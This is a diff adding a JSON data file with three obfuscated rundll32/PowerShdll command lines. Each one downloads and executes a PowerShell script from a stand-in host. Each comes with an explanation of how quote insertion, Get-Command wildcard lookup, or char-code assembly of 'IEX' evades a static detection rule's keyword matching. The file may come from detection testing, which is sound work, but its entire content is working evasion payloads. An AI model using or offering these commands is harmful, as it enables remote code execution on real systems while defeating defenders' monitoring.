@@ -1,0 +1,14 @@
+[
+  {
+    "output": "rundll32.exe PowerShdll.dll,main -w \"I\"\"EX (New-Object Net.WebClient).DownloadString('http://example.com/test.ps1')\"",
+    "explanation": "Insertion technique: Injects internal double quotes into the PowerShell command token ('I\"\"EX'). The Windows command-line parser collapses or strips nested quote structures smoothly when delivering arguments to an executed process. However, because it fractures the sequential character flow, it prevents the static signature engine from matching the contiguous monitored substring 'IEX ' or 'Invoke-Expression'."
+  },
+  {
+    "output": "rundll32.exe PowerShdll.dll,main -w \".((gcm *e-Ex*).name) (New-Object Net.WebClient).DownloadString('http://example.com/test.ps1')\"",
+    "explanation": "Substitution technique: Employs PowerShell command discovery dynamic indexing (via Get-Command/gcm and a wildcard string) to retrieve and invoke the underlying target function payload. In a simulated lab test instance, this translates directly to evaluating the 'Invoke-Expression' method implicitly, bypassing the rule's strict string checks on explicit keywords like 'IEX ' or 'Invoke-Expression'."
+  },
+  {
+    "output": "rundll32.exe PowerShdll.dll,main -w \"& (([char]73)+([char]69)+([char]88)) (New-Object Net.WebClient).DownloadString('http://example.com/test.ps1')\"",
+    "explanation": "Recoding / Encoding technique: Encodes the 'IEX' operator string token entirely into an array of primitive ASCII decimal character blocks (`[char]73`, `[char]69`, `[char]88`) which are dynamically re-assembled and called using the invocation call operator `&`. This ensures the static keyword pattern required by the `selection_cli` monitoring layer is absent from the unexpanded command-line process telemetry."
+  }
+]
